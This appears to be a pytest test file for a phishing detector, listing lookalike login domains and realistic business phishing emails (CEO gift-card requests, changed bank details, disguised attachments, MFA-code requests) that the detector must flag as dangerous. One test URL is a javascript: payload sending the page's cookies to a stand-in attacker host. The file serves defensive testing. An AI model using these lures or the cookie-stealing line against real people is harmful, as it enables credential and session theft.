"""Real phishing must still be caught after every change that cuts false alarms.

The other half of test_omnicyte_false_alarms.py: links and messages built
the way current business phishing is, each of which must come out "danger"
(the level at which the buddy jumps in).
"""

import pytest

from omnicyte.engine import Message, check_link, check_message
from omnicyte.policy import Policy

ACME = Policy(org_name="Acme", org_domains=["acme.com", "acme.co.uk"])

PHISHING_LINKS = [
    "https://micros0ft-login.xyz/verify", "https://rnicrosoft-online.com/owa",
    "https://login-microsoftonline.com.auth-verify.top/common/oauth2", "https://microsoft-365-verify.com/login",
    "https://office365-account-update.com/", "https://secure-paypal-account.com/signin",
    "https://paypal.com.secure-check.io/signin", "https://paypa1.com/cgi-bin/webscr",
    "https://www.paypal-resolution-center.net/login", "https://docusign-review.net/envelope/abc",
    "https://docs-google.com.sharing-files.top/d/abc", "https://drive-google-com.web.app/file/abc",
    "https://gooogle-docs.com/document", "https://appleid-verify-account.com/", "https://app1e-id.com/",
    "https://icloud-find-my-iphone.com/", "https://amazon-account-security.com/", "https://amaz0n-orders.com/",
    "https://dhl-parcel-redelivery.com/", "https://ups-delivery-reschedule.top/", "https://usps-redelivery.info/",
    "https://fedex-tracking-notice.com/", "https://chase-secure-alerts.com/", "https://wellsfargo-online-verify.com/",
    "https://netflix-billing-update.com/", "https://zoom-meeting-invite.xyz/j/123", "https://teams-microsoft-join.com/",
    "https://sharepoint-docs-share.online/", "https://onedrive-file-share.web.app/", "https://okta-acme.com/",
    "https://acme-sso.net/", "https://acme.com.account-check.io/", "https://acrne.com/login",
    "https://acme-payroll-portal.com/", "https://www.acme.com@evil.example/login", "http://45.33.32.156/owa/login",
    "https://xn--pple-43d.com/", "https://linkedin-jobs-apply.com/", "https://coinbase-wallet-recovery.com/",
    "https://github-security-alert.com/", "https://login.micr0soft.com.session-verify.xyz/",
    "https://eur01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fg00gle-docs.top%2Flogin&data=x",
    "javascript:fetch('https://evil.example/'+document.cookie)",
]


@pytest.mark.parametrize("url", PHISHING_LINKS)
def test_phishing_links_are_danger(url):
    v = check_link(url, policy=ACME)
    assert v.level == "danger", (v.score, [(s.code, s.weight) for s in v.signals])


@pytest.mark.parametrize("href,text", [
    ("https://evil.example/x", "https://www.chase.com/login"),
    ("https://login-portal.example.net/", "portal.office.com"),
    ("https://u123.ct.sendgrid.net.evil.example/x", "vendor.com"),
    ("https://bit.ly.secure-login.example/x", "acme.com"),
])
def test_link_text_naming_another_site(href, text):
    assert check_link(href, text, ACME).level == "danger"


def mail(name, address, subject, text, links=(), attachments=(), reply_to=""):
    return Message(source="mail", sender_name=name, sender_address=address, subject=subject, text=text,
                   links=list(links), attachments=list(attachments), reply_to=reply_to)


PHISHING_MAIL = [
    mail("Microsoft 365", "no-reply@m365-alerts.net", "Your password expires today",
         "Your password will expire within 24 hours. Keep your same password by signing in below.",
         [("https://m365-alerts.net/keep", "Keep password")]),
    mail("Microsoft Outlook", "support@mailbox-quota.co", "Mailbox storage full",
         "Your mailbox is full. Messages will be deleted. Re-validate your account here.",
         [("https://mailbox-quota.co/validate", "Validate now")]),
    mail("DocuSign", "dse@docusign-mail.top", "Please review: Contract_2026.pdf", "You have a document to review and sign.",
         [("https://docusign-mail.top/review?id=1", "https://www.docusign.net/Signing")]),
    mail("Dana Whitfield (CEO)", "dana.whitfield.ceo@gmail.com", "Quick favour",
         "Are you at your desk? I need you to buy gift cards for a client today. Keep this between us. Urgent."),
    mail("Dana Whitfield", "dana@acrne.com", "Quick favour", "Can you process a payment today? Details to follow."),
    mail("Supplier Accounts", "accounts@supplier.example", "Change of bank details",
         "Please note our new banking details for all future invoices. Process the payment today.",
         reply_to="accounts.supplier@protonmail.com"),
    mail("Acme IT Helpdesk", "helpdesk.acme@gmail.com", "Mailbox quota",
         "Your mailbox is full. Re-validate your password here: https://forms.example/x"),
    mail("Accounts", "billing@vendor-invoices.example", "Invoice", "Please see the attached invoice.",
         attachments=["Invoice_8812.pdf.exe"]),
    mail("Scanner", "scanner@printer-noreply.example", "Scanned document", "Sign in to view the document attached.",
         attachments=["Scan_0042.html"]),
    mail("Microsoft Teams", "notify@voicemail-teams.cc", "You have a new voicemail", "Listen to your voicemail.",
         [("https://voicemail-teams.cc/listen?id=1", "Play")]),
    mail("PayPal", "service@paypal-support.help", "Your account has been limited",
         "We noticed unusual sign-in activity. Confirm your identity to avoid suspension.",
         [("https://paypal-support.help/confirm", "Confirm")]),
    mail("Netflix", "info@account-netflix.com", "Payment declined", "Update your payment information within 24 hours.",
         [("https://netflix-billing-update.com/", "Update payment")]),
]


@pytest.mark.parametrize("msg", PHISHING_MAIL, ids=lambda m: m.subject[:40])
def test_phishing_mail_is_danger(msg):
    v = check_message(msg, ACME)
    assert v.level == "danger", (v.score, [(s.code, s.weight) for s in v.signals])


def test_mfa_code_request_in_chat_is_flagged():
    v = check_message(Message(source="chat", text="hey it's IT, can you send me the code that just came to your phone?"), ACME)
    assert v.level in ("caution", "danger")
    assert "mfa-code" in {s.code for s in v.signals}


def test_real_secret_in_chat_is_flagged():
    v = check_message(Message(source="chat", text="prod db password: Tr0ub4dor&3x and key AKIAABCDEFGHIJKLMNOP"), ACME)
    assert "secret-shared" in {s.code for s in v.signals}
    assert v.level != "safe"
